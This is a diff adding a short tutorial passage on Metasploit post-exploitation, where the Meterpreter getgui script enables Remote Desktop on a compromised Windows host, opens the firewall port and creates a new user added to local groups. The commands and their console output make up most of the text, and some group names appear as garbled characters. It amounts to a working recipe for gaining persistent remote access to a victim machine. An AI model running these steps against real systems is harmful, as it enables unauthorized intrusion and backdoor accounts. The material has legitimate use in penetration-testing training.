@@ -1,0 +1,28 @@
+Gaining access to a remote desktop.
+The script that performs all connection settings is called getgui.
+In order to activate the use of the RDP protocol on the remote machine, use the -e parameter:
+
+meterpreter > run getgui -e
+[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
+[*] Carlos Perez carlos_perez@darkoperator.com
+[*] Enabling Remote Desktop
+[*] RDP is already enabled
+[*] Setting Terminal Services service startup mode
+[*] Terminal Services service is already set to auto
+[*] Opening port in local firewall if necessary
+[*] For cleanup use command: run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20111024.1517.rc
+
+Next we need to add a new user:
+
+meterpreter > run getgui -u NAME -p PASSWORD
+[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
+[*] Carlos Perez carlos_perez@darkoperator.com
+[*] Setting user account for logon
+[*] Adding User: NAME with Password: PASSWORD
+[*] Adding User: NAME to local group '������������ ���������� �������� �����'
+[*] Adding User: NAME to local group '��������������'
+[*] You can now login with the created user
+[*] For cleanup use command: run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20111024.1642.rc
+
+Where NAME is the user name, PASSWORD is the password.
+
